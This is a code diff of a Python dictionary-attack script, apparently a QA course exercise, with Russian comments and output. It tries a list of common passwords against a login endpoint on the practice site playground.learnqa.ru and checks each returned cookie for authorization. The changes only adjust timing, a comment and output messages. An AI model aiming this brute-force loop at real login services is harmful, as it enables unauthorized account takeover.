@@ -16,10 +16,9 @@ class Info:
     pass
 
 print(Info.__doc__)
-time.sleep(5)
+time.sleep(3)
 print(Fore.YELLOW, '\n ПЕРЕБИРАЕМ!', Style.RESET_ALL)
 time.sleep(1)
-
 
 top_password_list = ['password', 'batman', '123456', '123456789', '12345678', '12345', 'qwerty', 'abc123', '1234567',
 'monkey', '1234', 'football', 'Football', '1234567890', 'dragon', 'baseball', 'sunshine', 'iloveyou',
@@ -38,14 +37,15 @@ for i in range(0, len(top_password_list)):
     autch_cookies = dict(autch.cookies.items())
     print(Fore.BLUE, f'{autch_cookies} |', Style.RESET_ALL, end='')
 
-    # проверка авторизации
+    # проверка статуса авторизации
     check_auth_cookie = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies = autch_cookies)
 
     if 'You are authorized' in check_auth_cookie.text:
-        print(Fore.GREEN, f'{check_auth_cookie.text} / ', 'Пароль найден: >', Style.RESET_ALL, end='')
-        print(Fore.YELLOW, f'{pass_count}\n\n', Style.RESET_ALL)
+        print(Fore.GREEN, f'{check_auth_cookie.text} !!! / ', 'верный пароль найден: >', Style.RESET_ALL, end='')
+        print(Fore.YELLOW, f'{pass_count}\n', Style.RESET_ALL)
     else:
-        print(Fore.RED, check_auth_cookie.text, Style.RESET_ALL)
+        print(Fore.RED, check_auth_cookie.text, Style.RESET_ALL, end='')
+        print(Fore.MAGENTA, f' / пароль > {pass_count} не верный\n', Style.RESET_ALL)
 
 
 
